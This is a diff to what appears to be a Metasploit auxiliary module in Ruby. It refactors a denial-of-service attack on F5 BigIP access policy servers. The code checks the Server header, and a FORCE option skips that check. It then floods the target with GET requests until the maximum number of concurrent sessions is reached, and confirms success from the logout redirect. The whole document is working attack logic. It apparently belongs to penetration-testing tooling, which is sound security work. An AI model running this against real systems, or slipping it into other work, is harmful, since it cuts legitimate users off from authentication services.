@@ -50,52 +50,46 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-    # Main function
-    rlimit = datastore['RLIMIT']
+    limit = datastore['RLIMIT']
     force_attack = datastore['FORCE']
 
-    # Send an initial test request
     res = send_request_cgi('method' => 'GET', 'uri' => '/')
-    if res
-      server = res.headers['Server']
-      # Simple test based on HTTP Server header to detect BigIP virtual server
-      unless force_attack
-        if server !~ /BIG\-IP/ && server !~ /BigIP/
-          print_error("#{peer} - BigIP virtual server was not detected. Please check options")
-          return
-        end
-      end
-      print_good("#{peer} - Starting DoS attack")
-    else
-      print_error("#{peer} - Unable to connect to BigIP. Please check options")
+
+    unless res
+      print_error("#{peer} - No answer from the BigIP server")
       return
     end
 
+    # Simple test based on HTTP Server header to detect BigIP virtual server
+    server = res.headers['Server']
+    unless server =~ /BIG\-IP/ || server =~ /BigIP/ || force_attack
+      print_error("#{peer} - BigIP virtual server was not detected. Please check options")
+      return
+    end
+
+    print_status("#{peer} - Starting DoS attack")
+
     # Start attack
-    (1..rlimit).each do
+    limit.times do
       res = send_request_cgi('method' => 'GET', 'uri' => '/')
-      if res && res.headers['Location'] == '/my.logout.php3?errorcode=14'
-        print_good("#{peer} - The maximum number of concurrent user sessions has been reached. No new user sessions can start at this time")
-        print_good("#{peer} - DoS attack is successful")
+      if res && res.headers['Location'] =~ /\/my\.logout\.php3\?errorcode=14/
+        print_good("#{peer} - DoS accomplished: The maximum number of concurrent user sessions has been reached.")
         return
       end
     end
 
-    # Check if attack is unsuccessfull
+    # Check if attack has failed
     res = send_request_cgi('method' => 'GET', 'uri' => uri)
-    if res.headers['Location'] == '/my.policy'
-      print_status("#{peer} - DoS attack is unsuccessful. Try to increase the RLIMIT number")
+    if res.headers['Location'] =~ /\/my.policy/
+      print_error("#{peer} - DoS attack failed. Try to increase the RLIMIT")
     else
       print_status("#{peer} - Result is undefined. Try to manually determine DoS attack result")
     end
 
     rescue ::Rex::ConnectionRefused
-      print_error("#{peer} - Unable to connect to BigIP")
+      print_error("#{peer} - Unable to connect to BigIP. Maybe BigIP 'Max In Progress Sessions Per Client IP' counter was reached")
     rescue ::Rex::ConnectionTimeout
-      print_error("#{peer} - Unable to connect to BigIP. Please check options")
-    rescue ::Errno::ECONNRESET
-      print_error("#{peer} - The connection was reset. Probably BigIP \"Max In Progress Sessions Per Client IP\" counter was reached")
-      print_status("#{peer} - DoS attack is unsuccessful")
+      print_error("#{peer} - Unable to connect to BigIP.")
     rescue ::OpenSSL::SSL::SSLError
       print_error("#{peer} - SSL/TLS connection error")
   end
